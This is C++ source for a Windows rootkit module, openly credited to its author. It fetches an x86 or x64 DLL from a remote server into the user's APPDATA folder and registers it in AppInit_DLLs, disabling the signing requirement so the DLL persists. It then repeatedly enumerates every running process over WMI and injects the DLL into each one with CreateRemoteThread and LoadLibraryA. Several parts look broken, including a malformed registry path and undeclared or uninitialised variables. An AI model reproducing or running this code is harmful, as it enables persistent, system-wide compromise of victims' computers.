//dont skid this leave credit - CODED BY FREAK - http://pastebin.com/u/KekSec - https://github.com/freakanonymous
//please star me on github :D
#pragma once
#ifndef NO_ROOTKIT
#ifndef __RKIT_LOADED
#define __RKIT_LOADED
#include <Windows.h>
#define _WIN32_DCOM
#include <iostream>
using namespace std;
#include <comdef.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")
#include <atlbase.h>
#include <atlstr.h>
class WMITask
{
protected:

    void WMIConnect(char *dllpath, DWORD mypid);
    int WMIGetUserProcesses(char *dllpath, DWORD mypid);

    //////////////////////////////////////////////////////
    //////////////////WMI Structs/////////////////////////
    CComPtr< IWbemLocator > locator;
    CComPtr< IWbemServices > service;
    CComPtr< IEnumWbemClassObject > enumerator;

    CComPtr< IWbemClassObject > object;

    HRESULT WMIHandle;
    ///////////////////////////////////////////////////////

public:

    //////////////////////////////////////////////////////
    /////////////////WMI Vaiables/////////////////////////

    // WMI Vars : Process
    CString sUserProcesses;

    DWORD mypid;
    ///////////////////////////////////////////////////////

    WMITask(char* dllpath, DWORD mypid);
    ~WMITask();

    void WMIConnect(char* dllpath, DWORD mypid);


};

// Contructor
//__________________________________________________________________________________
WMITask::WMITask(char *dllpath, DWORD mypid)
{
    WMIConnect(dllpath, mypid);
}

// Destructor
//__________________________________________________________________________________
WMITask::~WMITask()
{
    // Todo; CoUninitialize(); should go here instead of Connect(); as well as more clean up
}

// WMI Handler
//_____________________________________________________________________________
void WMITask::WMIConnect(char *dllpath, DWORD mypid)
{
    // http://msdn.microsoft.com/en-us/library/aa389273(v=VS.85).aspx

    int result = 0;
    WMIHandle = CoInitializeEx(NULL, COINIT_MULTITHREADED);

    // setup process-wide security context
    WMIHandle = CoInitializeSecurity(NULL,	// we're not a server
        -1,			// we're not a server
        NULL,		// we're not a server
        NULL,		// reserved
        RPC_C_AUTHN_LEVEL_DEFAULT, // let DCOM decide
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_NONE,
        NULL);

    // we're going to use CComPtr<>s, whose lifetime must end BEFORE CoUnitialize is called
    // connect to WMI
    WMIHandle = CoCreateInstance(CLSID_WbemAdministrativeLocator, NULL,
        CLSCTX_INPROC_SERVER,
        IID_IWbemLocator, reinterpret_cast<void**>(&locator));

    if (FAILED(WMIHandle))
    {
        // Instantiation of IWbemLocator failed

        CoUninitialize();
        return;
    }

    // connect to local service with current credentials
    WMIHandle = locator->ConnectServer(L"root\\cimv2", NULL, NULL, NULL,
        WBEM_FLAG_CONNECT_USE_MAX_WAIT,
        NULL, NULL, &service);

    if (SUCCEEDED(WMIHandle))
    {
        WMIGetUserProcesses(dllpath, mypid);

    }
    else {
        // Couldn't connect to service
    }
    CoUninitialize();
}



int WMITask::WMIGetUserProcesses(char * dllpath, DWORD mypid)
{
    /////////////////////////////////////////////////////////////////////////////////////////
    // Var's & Class Declerations
    //

    int statusreturn = 0;
    ULONG retcnt;
    _bstr_t str;
    _bstr_t STR;
    _variant_t var_val;
    _variant_t pVal;

    CString Caption;
    CString ProcessId;
    CString ProcessStr;
    CString User;

    IWbemClassObject* pClass;
    IWbemClassObject* pwcrGetOwnerIn = NULL;
    IWbemClassObject* pwcrGetOwnerOut = NULL;
    IWbemClassObject* pOutParams = NULL;

    /////////////////////////////////////////////////////////////////////////////////////////
    // Execute
    //

    // Execute Service Query
    // --------------------------------------------------
    WMIHandle = service->ExecQuery(L"WQL", L"SELECT * FROM Win32_Process",
        WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, &enumerator);
    // --------------------------------------------------
    if (SUCCEEDED(WMIHandle))		// - Check Query Result
    {
        // --------------------------------------------------
        for (;;) {						// - Endless Loop, Must break manually
        // --------------------------------------------------
            WMIHandle = enumerator->Next(WBEM_INFINITE, 1L, reinterpret_cast<IWbemClassObject**>(&object), &retcnt);
            // --------------------------------------------------
            if (SUCCEEDED(WMIHandle))	// - Check Query Result
            {
                if (retcnt > 0)			// - Check if anymore object vars are avalible
                {
                        WMIHandle = object->Get(L"ProcessId", 0, &var_val, NULL, NULL);
                        int theproc = var_val.intVal;

                        if (!IsInjected(theproc) && theproc != mypid) {
                            HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, false, theproc);
                            if (h)
                            {
                                LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
                                LPVOID dereercomp = VirtualAllocEx(h, NULL, strlen(dllpath), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
                                WriteProcessMemory(h, dereercomp, dllpath, strlen(dllpath), NULL);
                                HANDLE asdc = CreateRemoteThread(h, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, dereercomp, 0, NULL);
                                WaitForSingleObject(asdc, INFINITE);
                                VirtualFreeEx(h, dereercomp, strlen(dllpath), MEM_RELEASE);
                                CloseHandle(asdc);
                                CloseHandle(h);
                            };
                        }

                    
                }
                else {
                    statusreturn = -3; break; // Enumeration empty(emptied)
                }
            }
            else {
                statusreturn = -2; // Error in iterating through enumeration
            }
        }
    }
    else {
        statusreturn = -1; // Bad ExecQuery
    }

    // Release Memory
    // --------------------------------------------------
    VariantClear(&var_val);
    VariantClear(&pVal);
    pClass->Release();
    pwcrGetOwnerOut->Release();
    pOutParams->Release();
    object.Release();

    Caption.ReleaseBuffer();
    ProcessId.ReleaseBuffer();
    ProcessStr.ReleaseBuffer();
    User.ReleaseBuffer();

    return statusreturn;
}
char* dllhide = "noneyabusiness";
char *mutexseparator = "/";
bool IsInjected(DWORD pid)
{
	CHAR Mutant[64];
	sprintf(Mutant, "%d%s%s", pid, mutexseparator, dllhide);
	HANDLE hMu = OpenMutexA(MAXIMUM_ALLOWED, 0, Mutant);
	if (!hMu)
		return 0;
	CloseHandle(hMu);

	return 1;
}
#pragma comment(lib, "urlmon.lib")

void DownloadFile(char* url, char* dest) {

	HINTERNET hInet;
	hInet = InternetOpenA("Dll Getter", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	if (!hInet) return;
	HANDLE fh, f;
	
	fh = InternetOpenUrl(ih, url, NULL, 0, 0, 0);
	if (fh != NULL) {

		// open the file
		f = CreateFile(dest, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
		// make sure that our file handle is valid
		if (f < (HANDLE)1) {
			return;
		}
		char fbuff[512];
		DWORD r = 0, d = 0;
		do {
			memset(fbuff, 0, sizeof(fbuff));
			InternetReadFile(fh, fbuff, sizeof(fbuff), &r);
			WriteFile(f, fbuff, r, &d, NULL);
		} while (r > 0);
		CloseHandle(f);
	}
}
DWORD WINAPI rootkit(LPARAM none) {


	int err = 0;
	WSADATA WSAdata;
	if ((err = WSAStartup(MAKEWORD(2, 2), &WSAdata)) != 0)
		return 0;
	if (LOBYTE(WSAdata.wVersion) != 2 || HIBYTE(WSAdata.wVersion) != 2) {
		WSACleanup();
		return 0;
	}
	ih = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (ih == NULL) ih = 0;

	HKEY hKey;
	long result = RegOpenKeyExA(
		HKEY_LOCAL_MACHINE,
		(LPCSTR)"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs",
		0,
		KEY_WRITE,
		&hKey
	);
	char dllinstallpath[MAX_PATH + 17];
	sprintf(dllinstallpath, "%s\\%s\\%s_.dll", std::getenv("APPDATA"), dllhide, dllhide);
	struct stat buffer;
	char url[512];
	if (stat(dllinstallpath, &buffer) != 0) {
		SYSTEM_INFO sysInfo, * lpInfo;
		lpInfo = &sysInfo;
		::GetSystemInfo(lpInfo);
		switch (lpInfo->wProcessorArchitecture) {
		case PROCESSOR_ARCHITECTURE_AMD64:
		case PROCESSOR_ARCHITECTURE_IA64:
			sprintf(url, "http://%s/x64.dll", dllserver);
			break;
		case PROCESSOR_ARCHITECTURE_INTEL:
			sprintf(url, "http://%s/x86.dll", dllserver);
			break;
		case PROCESSOR_ARCHITECTURE_UNKNOWN:
		default:
			return 1;
		}
	}
	DownloadFile(url, dllinstallpath);
	if (!FileExists(dllinstallpath)) return 2;

	if (result == ERROR_SUCCESS) {

		DWORD value0 = 0;
		DWORD value1 = 1;
		RegSetValueExA(hKey, "AppInit_DLLs", 0, REG_SZ, (BYTE*)dllinstallpath, (strlen(dllinstallpath) + 1) * sizeof(char));
		RegSetValueExA(hKey, "RequireSignedAppInit_DLLs", 0, REG_DWORD, (BYTE*)value0, sizeof(DWORD));
		RegSetValueExA(hKey, "LoadAppInit_DLLs", 0, REG_DWORD, (BYTE*)value1, sizeof(DWORD));
		RegCloseKey(hKey);
	}
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;
    DWORD mypid = GetCurrentProcessId();
	while (1) {
        WMITask wmi = WMITask(dllinstallpath, mypid);
        Sleep(100);
	}
}
#endif
#endif
